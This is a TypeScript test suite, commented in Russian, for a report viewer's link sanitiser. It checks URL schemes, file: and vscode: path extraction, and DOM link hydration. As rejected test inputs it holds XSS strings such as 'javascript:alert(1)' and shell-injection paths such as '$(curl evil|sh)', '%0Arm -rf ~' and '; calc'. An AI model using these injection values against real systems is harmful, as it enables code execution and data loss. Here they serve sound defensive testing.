// Запуск: npm run test:build (node --test, встроенная поддержка TypeScript).
// Ссылки отчёта (M6, задача 15a): схема и право перехода — те же правила, что `zam_core::link`
// (общий набор `crates/zam-core/tests/fixtures/link_schemes.json` читают оба теста), сверка с
// разбором URL самого движка (и на случайных строках); невидимые символы — общий набор
// `invisible_chars.json`; путь для кнопки «копировать путь»; проход по ссылкам на макете DOM.
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { test } from 'node:test';
import {
  COPY_PATH_LABEL,
  INVISIBLE_RANGES,
  REPORT_LINK_SCHEMES,
  SHOWN_MAX,
  hydrateReportLinks,
  isInvisible,
  linkPath,
  reportLinkAllowed,
  reportLinkClickable,
  shorten,
  unsafePathText,
  urlScheme,
} from '../src/lib/reportLinks.ts';

interface Vector {
  t: string;
  scheme: string | null;
  report: boolean;
  click: boolean;
}

const fixture = (name: string) =>
  JSON.parse(readFileSync(new URL(`../../crates/zam-core/tests/fixtures/${name}`, import.meta.url), 'utf8'));
const vectors = fixture('link_schemes.json') as Vector[];
const invisible = fixture('invisible_chars.json') as { ranges: [number, number][]; invisible: number[]; visible: number[] };

const seenBy = (t: string): string | null => {
  try {
    return new URL(t, 'http://zam.invalid/').protocol.slice(0, -1);
  } catch {
    return null;
  }
};

test('REPORT_LINK_SCHEMES — как zam_core::REPORT_LINK_SCHEMES', () => {
  assert.deepEqual([...REPORT_LINK_SCHEMES], ['http', 'https', 'mailto', 'vscode', 'file']);
});

test('urlScheme — общий набор примеров с zam-core', () => {
  assert.ok(vectors.length >= 80, String(vectors.length));
  for (const v of vectors) {
    const what = JSON.stringify(v.t);
    assert.equal(urlScheme(v.t), v.scheme, what);
    const allowed = v.scheme !== null && REPORT_LINK_SCHEMES.includes(v.scheme);
    assert.equal(allowed, v.report, what);
  }
});

test('reportLinkClickable — общий набор примеров с zam-core', () => {
  let yes = 0;
  let no = 0;
  for (const v of vectors) {
    const what = JSON.stringify(v.t);
    assert.equal(reportLinkClickable(v.t), v.click, what);
    if (v.click && v.scheme !== null) assert.ok(v.report && v.scheme !== 'file', what);
    if (v.click) yes++;
    else no++;
  }
  assert.ok(yes >= 30 && no >= 30, `${yes}/${no}`);
  // адрес в сотню килобайт — без зависаний
  assert.equal(reportLinkClickable(`http://example.org/${'a'.repeat(100_000)}`), true);
  assert.equal(urlScheme(`${'a'.repeat(100_000)}:x`)?.length, 100_000);
  assert.equal(reportLinkClickable(`${'a'.repeat(100_000)}:x`), false);
  assert.equal(reportLinkClickable(`vscode://file/${'a/'.repeat(50_000)}`), true);
});

test('urlScheme согласна с разбором URL движка (WHATWG)', () => {
  for (const v of vectors) {
    const what = JSON.stringify(v.t);
    const seen = seenBy(v.t);
    // схемы нет — движок читает адрес относительным (схема базы)
    if (v.scheme === null) assert.equal(seen, 'http', what);
    // схема есть — движок видит её же (или отвергает адрес целиком)
    else assert.ok(seen === null || seen === v.scheme, `${what}: ${seen}`);
  }
});

test('urlScheme против new URL на случайных строках (фиксированное зерно)', () => {
  // те же куски и генератор, что в crates/zam-markdown/tests/link_scheme_fuzz.rs
  const parts = [
    'j', 'a', 'v', 's', 'c', 'r', 'i', 'p', 't', 'J', 'A', 'S', 'h', 'f', 'l', 'e', 'd', 'o', ':',
    ':', '/', '//', '\\', ' ', '\t', '\n', '\r', '\u0000', '\u0001', '\u000b', '\u000c', '\u001f', '%',
    '3A', '+', '-', '.', '1', '#', '?', '@', '\u00a0', '\u200b', '\ufeff', '\u017f',
    '\uff1a', '\u0430', '&',
  ];
  let x = 0x15a_2026;
  const next = () => {
    x ^= x << 13;
    x >>>= 0;
    x ^= x >>> 17;
    x ^= x << 5;
    x >>>= 0;
    return x;
  };
  const check = (s: string) => {
    const ours = urlScheme(s);
    let seen: string | null | undefined;
    try {
      seen = new URL(s).protocol.slice(0, -1);
    } catch {
      // без базы: относительный адрес или недействительный со схемой — различает разбор с базой
      seen = undefined;
    }
    if (seen !== undefined) return assert.equal(ours, seen, JSON.stringify(s));
    const based = seenBy(s);
    // схемы нет: относительный адрес (схема базы) либо недействительный (`//[`) — но не чужая схема
    if (ours === null) assert.ok(based === 'http' || based === null, `${JSON.stringify(s)}: ${based}`);
    else assert.ok(based === null || based === ours, `${JSON.stringify(s)}: ${based}`);
    if (ours !== null && reportLinkClickable(s)) assert.ok(['http', 'https', 'mailto', 'vscode'].includes(ours));
  };
  let withScheme = 0;
  for (let i = 0; i < 40_000; i++) {
    const n = next() % 10;
    let s = '';
    for (let k = 0; k < n; k++) s += parts[next() % parts.length];
    if (urlScheme(s) !== null) withScheme++;
    check(s);
  }
  assert.ok(withScheme > 500, String(withScheme));
  for (const scheme of ['javascript', 'file', 'vscode', 'http', 'data', 'mailto']) {
    for (let i = 0; i < 2_000; i++) {
      let s = '';
      for (const part of [scheme, ':']) {
        if (next() % 3 === 0) s += parts[next() % parts.length];
        s += part;
      }
      check(`${s}//file/x`);
    }
  }
});

test('reportLinkAllowed: пять схем и относительные — да, прочее — нет', () => {
  for (const v of vectors) {
    const what = JSON.stringify(v.t);
    if (v.scheme === null) assert.equal(reportLinkAllowed(v.t), true, what);
    else assert.equal(reportLinkAllowed(v.t), v.report, what);
  }
  for (const bad of [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    ' javascript:alert(1)',
    'java\tscript:alert(1)',
    'java\nscript:alert(1)',
    '\u0000javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'ftp://example.org/a',
    'vbscript:x',
    'blob:https://example.org/1',
  ])
    assert.equal(reportLinkAllowed(bad), false, JSON.stringify(bad));
  // адрес, который движок не разбирает, — отказ
  assert.equal(reportLinkAllowed('http://'), false);
});

test('INVISIBLE_RANGES — общий набор с zam_core::text', () => {
  assert.deepEqual(INVISIBLE_RANGES.map(([a, b]) => [a, b]), invisible.ranges);
  assert.ok(invisible.invisible.length >= 20 && invisible.visible.length >= 10);
  for (const cp of invisible.invisible) assert.equal(isInvisible(cp), true, cp.toString(16));
  for (const cp of invisible.visible) assert.equal(isInvisible(cp), false, cp.toString(16));
});

test('linkPath: file: — путь ОС', () => {
  const cases: [string, string | null][] = [
    ['file:///C:/data/report.csv', 'C:\\data\\report.csv'],
    ['FILE:///c:/Users/u/a%20b.txt', 'c:\\Users\\u\\a b.txt'],
    ['file:///C:/%D0%9C%D0%BE%D0%B8/a.txt', 'C:\\Мои\\a.txt'],
    ['file:///C|/data/a.txt', 'C:\\data\\a.txt'],
    ['file:/C:/data/a.txt', 'C:\\data\\a.txt'],
    ['file:C:/data/a.txt', 'C:\\data\\a.txt'],
    ['file:///C:\\data\\a.txt', 'C:\\data\\a.txt'],
    ['file:///home/u/proj/a.rs', '/home/u/proj/a.rs'],
    ['file://localhost/etc/hosts', '/etc/hosts'],
    ['file:/etc/hosts', '/etc/hosts'],
    ['file:///home/u/a.md#L10', '/home/u/a.md'],
    ['file:///home/u/a.md?x=1', '/home/u/a.md'],
    ['file:///home/u/a%23b.md', '/home/u/a#b.md'],
    ['file:///home/u/a b [1]{2}~*.md', '/home/u/a b [1]{2}~*.md'],
    ['  file:///home/u/a.md\n', '/home/u/a.md'],
    // пустой путь — копировать нечего
    ['file:///', null],
    ['file:', null],
  ];
  for (const [url, want] of cases) assert.equal(linkPath(url), want, url);
});

test('linkPath: сетевой путь — всегда UNC; «сервер» не из имени — пути нет', () => {
  const cases: [string, string | null][] = [
    ['file://server/share/dir/a.txt', '\\\\server\\share\\dir\\a.txt'],
    ['file://srv-01.corp.example/share/a', '\\\\srv-01.corp.example\\share\\a'],
    ['file:////server/share/a', '\\\\server\\share\\a'],
    ['file://///server/share/a', '\\\\server\\share\\a'],
    ['file:///%5C%5Cserver%5Cshare%5Ca', '\\\\server\\share\\a'],
    ['file:///\\\\server\\share\\a', '\\\\server\\share\\a'],
    ['file:\\\\server\\share\\a', '\\\\server\\share\\a'],
    ['file:///%2F%2Fserver/share', '\\\\server\\share'],
    // не имя сервера: диск, учётные данные, порт, IPv6, пробел, процент
    ['file://C:/data/a.txt', null],
    ['file://user:pw@server:445/share/a', null],
    ['file://user@server/share/a', null],
    ['file://server:445/share/a', null],
    ['file://[::1]/share/a', null],
    ['file://ser%20ver/share/a', null],
    ['file:////user@server/share/a', null],
    ['file:///%5C%5Cevil:445%5Cshare', null],
  ];
  for (const [url, want] of cases) assert.equal(linkPath(url), want, url);
});

test('linkPath: vscode: — путь после vscode://file/', () => {
  const cases: [string, string | null][] = [
    ['vscode://file/C:/proj/src/main.rs:10:5', 'C:/proj/src/main.rs:10:5'],
    ['vscode://file/c:/proj/a%20b.rs', 'c:/proj/a b.rs'],
    ['vscode://file/home/u/proj/a.rs:3', '/home/u/proj/a.rs:3'],
    ['VSCode://file/C:/x.rs', 'C:/x.rs'],
    ['vscode://file/C:/x.rs?windowId=1', 'C:/x.rs'],
    // сетевой путь через vscode: не кликается, но путь показать можно
    ['vscode://file//server/share/a.rs', '//server/share/a.rs'],
    // `authority` — точное `file`; не файл (команда расширения редактора) — не путь
    ['vscode://FILE/C:/x.rs', null],
    ['vscode://vscode.git/clone?url=x', null],
    ['vscode:extension/a.b', null],
    ['vscode://file', null],
    ['vscode://file/', null],
  ];
  for (const [url, want] of cases) assert.equal(linkPath(url), want, url);
});

test('linkPath: управляющие, невидимые и bidi после декодирования — пути нет', () => {
  for (const url of [
    'file:///tmp/x%0Arm%20-rf%20~',
    'file:///tmp/x%0D%0Acalc',
    'file:///tmp/a%00b',
    'file:///tmp/a%1Bb',
    'file:///tmp/%E2%80%AEgpj.exe',
    'file:///tmp/a%E2%80%A8b',
    'file:///tmp/a%E2%80%8Bb',
    'file:///tmp/a%E2%81%A0b',
    'file:///tmp/a%D8%9Cb',
    'file:///tmp/a%EF%BB%BFb',
    'file:///tmp/a%C2%ADb',
    'file:///tmp/a%F3%A0%80%81b',
    'vscode://file/C:/x%0Acalc.exe',
    'vscode://file/C:/x%7Fy',
    'file://ho%0Ast/share/a',
  ])
    assert.equal(linkPath(url), null, url);
  // прочие схемы — не путь
  for (const url of ['https://example.org/a', 'mailto:a@b.c', 'figs/a.png', 'javascript:alert(1)', ''])
    assert.equal(linkPath(url), null, url);
});

test('linkPath: знаки оболочки (bash, PowerShell, cmd) — пути нет (ревью 15a, I-2)', () => {
  for (const url of [
    'file:///tmp/$(curl evil|sh)',
    'file:///tmp/%24%28curl%20evil%7Csh%29',
    'file:///tmp/${IFS}x',
    'file:///tmp/$HOME',
    'file:///tmp/`id`',
    'file:///tmp/%60id%60',
    'file:///tmp/a;calc',
    'file:///tmp/a%3Bcalc',
    'file:///tmp/a|calc',
    'file:///tmp/a&calc',
    'file:///C:/a" & calc & "',
    'file:///C:/a%22%20%26%20calc%20%26%20%22',
    "file:///tmp/a' ; id ; '",
    'file:///tmp/a>b',
    'file:///tmp/a<b',
    'file:///C:/a/%25COMSPEC%25',
    'file:///C:/a/100%.txt',
    'file:///C:/a^b',
    'file:///C:/a!b',
    'file:///C:/a (calc)/b',
    'file://server/share/$(id)',
    'vscode://file/C:/a;calc',
    'vscode://file/C:/a%20%26%20calc',
    'vscode://file/home/u/$(id).rs',
  ])
    assert.equal(linkPath(url), null, url);
  for (const s of ['a`b', 'a$b', 'a;b', 'a|b', 'a&b', 'a<b', 'a>b', 'a"b', "a'b", 'a(b', 'a)b', 'a%b', 'a^b', 'a!b', 'a\nb', 'a\u202eb'])
    assert.equal(unsafePathText(s), true, JSON.stringify(s));
  for (const s of ['C:\\Мои документы\\a b.txt', '/home/u/a#b [1]{2}~*?.md', '\\\\server\\share\\a', 'C:/x.rs:10:5', 'a=b,c@d+e'])
    assert.equal(unsafePathText(s), false, s);
});

test('shorten: не длиннее предела, длинное — с «…»', () => {
  assert.equal(shorten('abc'), 'abc');
  const exact = 'я'.repeat(SHOWN_MAX);
  assert.equal(shorten(exact), exact);
  const long = shorten(`file:///${'я'.repeat(5000)}`);
  assert.equal([...long].length, SHOWN_MAX + 1);
  assert.ok(long.endsWith('…'));
  // суррогатная пара не режется пополам
  assert.equal(shorten('😀'.repeat(SHOWN_MAX + 5)), `${'😀'.repeat(SHOWN_MAX)}…`);
});

// ---- макет DOM: ровно то, чем пользуется hydrateReportLinks ----

class El {
  attrs = new Map<string, string>();
  textContent = '';
  next: El[] = [];
  classList = { add: (c: string) => this.attrs.set('class', [this.attrs.get('class'), c].filter(Boolean).join(' ')) };
  tag: string;
  constructor(tag: string, attrs: Record<string, string> = {}, text = '') {
    this.tag = tag;
    for (const [k, v] of Object.entries(attrs)) this.attrs.set(k, v);
    this.textContent = text;
  }
  getAttribute(n: string) {
    return this.attrs.get(n) ?? null;
  }
  setAttribute(n: string, v: string) {
    this.attrs.set(n, v);
  }
  removeAttribute(n: string) {
    this.attrs.delete(n);
  }
  hasAttribute(n: string) {
    return this.attrs.has(n);
  }
  after(e: El) {
    this.next.push(e);
  }
}

function hydrate(links: El[], times = 1): void {
  const root = {
    querySelectorAll: (sel: string) => {
      assert.equal(sel, 'a[href], a[data-url]');
      return links.filter((a) => a.hasAttribute('href') || a.hasAttribute('data-url'));
    },
  };
  const g = globalThis as { document?: unknown };
  const before = g.document;
  g.document = { createElement: (tag: string) => new El(tag) };
  try {
    for (let i = 0; i < times; i++) hydrateReportLinks(root as unknown as ParentNode);
  } finally {
    g.document = before;
  }
}

test('hydrateReportLinks: href — только с правом перехода; file: и vscode: — адрес и кнопка', () => {
  const site = new El('a', { href: 'https://example.org/a' }, 'сайт');
  const anchor = new El('a', { href: '#h-x' }, 'якорь');
  const rel = new El('a', { href: 'api/v1/entries/1/attachments/x/a.csv' }, 'файл');
  const code = new El('a', { href: 'vscode://file/C:/proj/a.rs:10', rel: 'noopener noreferrer' }, 'код');
  const data = new El('a', { 'data-url': 'file:///C:/data/raw%20set/a.csv' }, 'данные');
  const auto = new El('a', { 'data-url': 'file:///home/u/notes.md' }, 'file:///home/u/notes.md');
  const cmd = new El('a', { 'data-url': 'vscode://vscode.git/clone?url=https://evil.example/x.git' }, 'клон');
  hydrate([site, anchor, rel, code, data, auto, cmd]);
  assert.equal(site.getAttribute('rel'), 'noopener noreferrer');
  assert.equal(anchor.getAttribute('rel'), null);
  assert.equal(rel.getAttribute('href'), 'api/v1/entries/1/attachments/x/a.csv');
  for (const a of [site, anchor, rel]) assert.equal(a.next.length, 0);
  // vscode://file/… — ссылка остаётся, рядом кнопка
  assert.equal(code.getAttribute('href'), 'vscode://file/C:/proj/a.rs:10');
  assert.equal(code.getAttribute('class'), null);
  assert.equal(code.getAttribute('data-print'), 'vscode://file/C:/proj/a.rs:10');
  assert.equal(code.next.length, 1);
  assert.equal(code.next[0].getAttribute('data-copy-path'), 'C:/proj/a.rs:10');
  assert.equal(code.next[0].textContent, COPY_PATH_LABEL);
  // file: — без href, путь ОС
  assert.equal(data.getAttribute('href'), null);
  assert.equal(data.getAttribute('class'), 'local-link');
  assert.equal(data.getAttribute('title'), 'C:\\data\\raw set\\a.csv');
  assert.equal(data.getAttribute('data-print'), 'file:///C:/data/raw%20set/a.csv');
  assert.equal(data.next[0].getAttribute('data-copy-path'), 'C:\\data\\raw set\\a.csv');
  // автоссылка: адрес уже текст ссылки — в печати не дублируется
  assert.equal(auto.getAttribute('data-print'), null);
  assert.equal(auto.next[0].getAttribute('data-copy-path'), '/home/u/notes.md');
  // команда расширения: без перехода и без кнопки, адрес — в подсказке и печати
  assert.equal(cmd.getAttribute('href'), null);
  assert.equal(cmd.next.length, 0);
  assert.equal(cmd.getAttribute('title'), 'vscode://vscode.git/clone?url=https://evil.example/x.git');
  assert.equal(cmd.getAttribute('class'), 'local-link');
});

test('hydrateReportLinks: вторая линия — снимает href и data-url, которых сервер прислать не должен', () => {
  const hostile = [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    ' javascript:alert(1)',
    'java\tscript:alert(1)',
    'data:text/html,x',
    'ftp://example.org/a',
    'vscode-insiders://file/x',
  ].map((h) => new El('a', { href: h, 'data-url': h }, 'x'));
  // допустимая схема, но без права перехода: href снимается, адрес остаётся текстом
  const file = new El('a', { href: 'file://attacker.example/share/x.txt' }, 'x');
  const cmd = new El('a', { href: 'vscode://vscode.git/clone?url=x' }, 'x');
  const unc = new El('a', { href: 'vscode://file//server/share/a.rs' }, 'x');
  const upper = new El('a', { href: 'vscode://FILE/C:/x.rs' }, 'x');
  const shell = new El('a', { 'data-url': 'file:///tmp/$(curl evil|sh)' }, 'x');
  const http = new El('a', { 'data-url': 'https://example.org' }, 'x');
  hydrate([...hostile, file, cmd, unc, upper, shell, http]);
  for (const a of hostile) {
    assert.equal(a.getAttribute('href'), null, a.attrs.get('href'));
    assert.equal(a.getAttribute('data-url'), null);
    assert.equal(a.next.length, 0);
    assert.equal(a.getAttribute('title'), null);
  }
  for (const a of [file, cmd, unc, upper]) {
    assert.equal(a.getAttribute('href'), null);
    assert.equal(a.getAttribute('class'), 'local-link');
    assert.ok(a.getAttribute('data-url'));
  }
  assert.equal(file.next[0].getAttribute('data-copy-path'), '\\\\attacker.example\\share\\x.txt');
  assert.equal(cmd.next.length, 0);
  assert.equal(unc.next[0].getAttribute('data-copy-path'), '//server/share/a.rs');
  assert.equal(upper.next.length, 0);
  // путь со знаками оболочки: кнопки нет, адрес — текстом в подсказке
  assert.equal(shell.next.length, 0);
  assert.equal(shell.getAttribute('title'), 'file:///tmp/$(curl evil|sh)');
  // data-url — только для file: и vscode:
  assert.equal(http.getAttribute('data-url'), null);
  assert.equal(http.next.length, 0);
});

test('hydrateReportLinks идемпотентна: повторный проход не добавляет кнопок', () => {
  const code = new El('a', { href: 'vscode://file/C:/proj/a.rs' }, 'код');
  const data = new El('a', { 'data-url': 'file:///C:/data/a.csv' }, 'данные');
  hydrate([code, data], 3);
  assert.equal(code.next.length, 1);
  assert.equal(data.next.length, 1);
  const snapshot = JSON.stringify([[...code.attrs], [...data.attrs]]);
  hydrate([code, data]);
  assert.equal(JSON.stringify([[...code.attrs], [...data.attrs]]), snapshot);
  assert.equal(code.next.length + data.next.length, 2);
});

test('hydrateReportLinks: метку «оформлено» из HTML не подделать; href проверяется и повторно', () => {
  // атрибуты-метки в недоверенном HTML проход не слушает
  const forged = new El('a', { href: 'javascript:alert(1)', 'data-zam-link': '', 'data-hydrated': '1' }, 'x');
  const forgedFile = new El('a', { href: 'file://attacker.example/share/x', 'data-zam-link': '' }, 'x');
  hydrate([forged, forgedFile]);
  assert.equal(forged.getAttribute('href'), null);
  assert.equal(forgedFile.getAttribute('href'), null);
  assert.equal(forgedFile.next.length, 1);
  // href, подменённый после первого прохода, снимается вторым; кнопок не прибавляется
  const code = new El('a', { href: 'vscode://file/C:/proj/a.rs' }, 'код');
  hydrate([code]);
  code.setAttribute('href', 'vscode://vscode.git/clone?url=x');
  hydrate([code]);
  assert.equal(code.getAttribute('href'), null);
  assert.equal(code.next.length, 1);
});

test('hydrateReportLinks: длинный адрес в подсказке и печати обрезан', () => {
  const url = `file:///home/u/${'каталог/'.repeat(400)}a.md`;
  const a = new El('a', { 'data-url': url }, 'длинный');
  hydrate([a]);
  for (const name of ['title', 'data-print']) {
    const v = a.getAttribute(name)!;
    assert.equal([...v].length, SHOWN_MAX + 1, name);
    assert.ok(v.endsWith('…'), name);
  }
  // кнопка копирует путь целиком, её подсказка — обрезана
  const btn = a.next[0];
  assert.ok(btn.getAttribute('data-copy-path')!.length > 2000);
  assert.equal([...btn.getAttribute('title')!].length, SHOWN_MAX + 1);
});
